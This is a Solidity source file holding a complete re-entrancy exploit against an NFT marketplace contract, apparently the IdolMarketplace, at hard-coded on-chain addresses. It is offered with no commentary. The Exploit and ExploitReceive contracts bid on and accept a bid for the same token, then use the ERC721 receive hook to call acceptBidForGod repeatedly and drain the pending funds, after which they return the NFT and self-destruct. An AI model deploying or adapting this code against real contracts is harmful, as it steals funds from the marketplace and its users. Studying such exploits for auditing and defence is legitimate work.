pragma solidity ^0.8.9;

import './IdolMarketplace.sol';

contract Exploit {
    IdolMarketplace public idolMarketplace = IdolMarketplace(payable(0x4CE4f4c4891876fFc0670BD9a25FCc4597db3bBF));
    IdolMain public idolMain = IdolMain(payable(0x439cac149B935AE1D726569800972E1669d17094));

    function attack(uint _id) public payable {

        ExploitReceive exploitReceive = new ExploitReceive(_id);
        address(exploitReceive).call{value: msg.value}("");

        // check if bid successfully
        (, uint nowBid) = idolMarketplace.godBids(_id);
        require(nowBid == msg.value, "Bid failed");

        // approve idolMarketplace to use your NFT and accept the bid
        idolMain.approve(address(idolMarketplace), _id);
        idolMarketplace.acceptBidForGod(_id, 0);

        // withdraw all ETH and transfer NFT back to Bob.
        idolMarketplace.withdrawPendingFunds();
        idolMain.transferFrom(address(this), msg.sender, _id);
        selfdestruct(payable(msg.sender));
    }

    function acceptBidAgain(uint _id) public {
        idolMarketplace.acceptBidForGod(_id, 0);
    }

    fallback() external payable { }
}

contract ExploitReceive {
    IdolMarketplace public idolMarketplace = IdolMarketplace(payable(0x4CE4f4c4891876fFc0670BD9a25FCc4597db3bBF));
    IdolMain public idolMain = IdolMain(payable(0x439cac149B935AE1D726569800972E1669d17094));
    Exploit public exploit;
    bytes4 constant ERC721_RECEIVED = 0x150b7a02;
    uint public id;
    uint public price;
    uint public times = 1;  // number of times to re-entrancy

    constructor(uint _id) {
        exploit = Exploit(payable(msg.sender));
        id = _id;
    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns(bytes4) {
        times++;
        idolMain.transferFrom(address(this), address(exploit), id);
        if (address(idolMarketplace).balance > times * price * 925 / 1000) {
            exploit.acceptBidAgain(id);
        }
        return ERC721_RECEIVED;
    }

    fallback() external payable {
        price = msg.value;
        idolMarketplace.enterBidForGod{value: price}(id);
    }
}

